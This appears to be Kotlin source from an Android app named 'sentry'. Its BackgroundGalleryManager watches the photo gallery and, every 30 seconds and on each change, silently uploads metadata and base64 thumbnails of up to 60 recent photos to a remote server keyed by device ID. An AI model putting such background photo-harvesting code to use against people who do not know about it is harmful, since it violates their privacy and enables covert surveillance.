package com.example.sentry.service

import android.content.ContentUris
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.core.content.ContextCompat
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.*

object BackgroundGalleryManager {
    private const val TAG = "BackgroundGalleryManager"
    private var syncJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var observerRegistered = false

    fun startListening(context: Context) {
        if (!observerRegistered) {
            try {
                val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
                    override fun onChange(selfChange: Boolean, uri: Uri?) {
                        super.onChange(selfChange, uri)
                        scope.launch {
                            delay(1000) // Debounce rapid writes
                            val client = SentryApiClient(context)
                            syncGallery(context, client)
                        }
                    }
                }
                context.contentResolver.registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    true,
                    observer
                )
                observerRegistered = true
                Log.d(TAG, "Gallery ContentObserver registered for real-time mobile gallery sync")
            } catch (e: Exception) {
                Log.w(TAG, "Could not register MediaStore observer: ${e.message}")
            }
        }

        if (syncJob?.isActive == true) return
        syncJob = scope.launch {
            val client = SentryApiClient(context)
            while (isActive) {
                try {
                    syncGallery(context, client)
                } catch (e: Exception) {
                    Log.w(TAG, "Error in Gallery sync loop: ${e.message}")
                }
                delay(30_000) // Periodic refresh every 30 seconds
            }
        }
    }

    suspend fun syncGallery(context: Context, client: SentryApiClient) {
        val hasPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }

        val deviceId = CryptoManager.getOrCreateDeviceId(context)
        val jsonArray = JSONArray()

        if (hasPermission) {
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.MIME_TYPE,
                MediaStore.Images.Media.WIDTH,
                MediaStore.Images.Media.HEIGHT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Images.Media.BUCKET_DISPLAY_NAME else MediaStore.Images.Media._ID
            )

            val cursor: Cursor? = try {
                context.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to query MediaStore: ${e.message}")
                null
            }

            cursor?.use { c ->
                val idIdx = c.getColumnIndex(MediaStore.Images.Media._ID)
                val nameIdx = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                val dateIdx = c.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)
                val sizeIdx = c.getColumnIndex(MediaStore.Images.Media.SIZE)
                val mimeIdx = c.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
                val widthIdx = c.getColumnIndex(MediaStore.Images.Media.WIDTH)
                val heightIdx = c.getColumnIndex(MediaStore.Images.Media.HEIGHT)
                val bucketIdx = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    c.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                } else -1

                val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())

                var count = 0
                while (c.moveToNext() && count < 60) {
                    val mediaId = if (idIdx >= 0) c.getLong(idIdx) else 0L
                    val name = if (nameIdx >= 0) c.getString(nameIdx) ?: "Photo_${mediaId}.jpg" else "Photo.jpg"
                    val dateAddedSec = if (dateIdx >= 0) c.getLong(dateIdx) else System.currentTimeMillis() / 1000
                    val sizeBytes = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L
                    val mimeType = if (mimeIdx >= 0) c.getString(mimeIdx) ?: "image/jpeg" else "image/jpeg"
                    val width = if (widthIdx >= 0) c.getInt(widthIdx) else 1080
                    val height = if (heightIdx >= 0) c.getInt(heightIdx) else 1920
                    val albumName = if (bucketIdx >= 0) c.getString(bucketIdx) ?: "Camera" else "Camera"

                    val sizeFormatted = when {
                        sizeBytes >= 1024 * 1024 -> String.format(Locale.US, "%.1f MB", sizeBytes / (1024.0 * 1024.0))
                        sizeBytes >= 1024 -> String.format(Locale.US, "%d KB", sizeBytes / 1024)
                        else -> "$sizeBytes B"
                    }

                    val dateFormatted = sdf.format(Date(dateAddedSec * 1000))
                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, mediaId)

                    // Extract fast compressed thumbnail
                    val thumbnailBase64 = extractThumbnailBase64(context, contentUri)

                    val obj = JSONObject().apply {
                        put("id", "media_$mediaId")
                        put("name", name)
                        put("album", albumName)
                        put("mimeType", mimeType)
                        put("size", sizeFormatted)
                        put("date", dateFormatted)
                        put("timestamp", dateAddedSec * 1000)
                        put("width", width)
                        put("height", height)
                        if (!thumbnailBase64.isNullOrBlank()) {
                            put("thumbnail", thumbnailBase64)
                        }
                    }
                    jsonArray.put(obj)
                    count++
                }
            }
        }

        if (jsonArray.length() > 0) {
            val body = JSONObject().apply {
                put("deviceId", deviceId)
                put("media", jsonArray)
            }
            client.syncGalleryMedia(body)
            Log.d(TAG, "Synced ${jsonArray.length()} mobile gallery photos to cloud for $deviceId")
        }
    }

    private fun extractThumbnailBase64(context: Context, uri: Uri): String? {
        return try {
            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.contentResolver.loadThumbnail(uri, Size(260, 260), null)
            } else {
                context.contentResolver.openInputStream(uri)?.use { stream ->
                    val options = BitmapFactory.Options().apply { inSampleSize = 4 }
                    BitmapFactory.decodeStream(stream, null, options)
                }
            } ?: return null

            val out = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (_: Exception) {
            null
        }
    }
}
